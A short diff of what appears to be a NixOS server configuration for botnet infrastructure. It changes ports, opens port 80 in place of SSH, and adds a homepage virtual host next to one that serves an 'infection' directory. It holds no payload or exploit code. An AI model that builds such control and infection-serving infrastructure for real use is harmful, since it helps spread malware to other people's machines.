@@ -4,7 +4,7 @@ let
 
   cfg = {
     proxyPort = 3128;
-    controlPort = 80;
+    controlPort = 1337;
     infectionPort = 13337;
     adminAddr = "foo";
     infectionDir = "/var/botnet/infection";
@@ -70,7 +70,7 @@ let
 in {
 
   networking.firewall.allowedTCPPorts = [
-    22 cfg.proxyPort cfg.controlPort
+    80 cfg.proxyPort cfg.controlPort
   ];
 
   users.extraUsers.botnet = {
@@ -88,6 +88,10 @@ in {
     group = cfg.group;
     adminAddr = cfg.adminAddr;
     virtualHosts = [
+      {
+        listen = [ { port = 80; } ];
+        documentRoot = ./homepage;
+      }
       {
         listen = [ { port = cfg.infectionPort; } ];
         documentRoot = cfg.infectionDir;
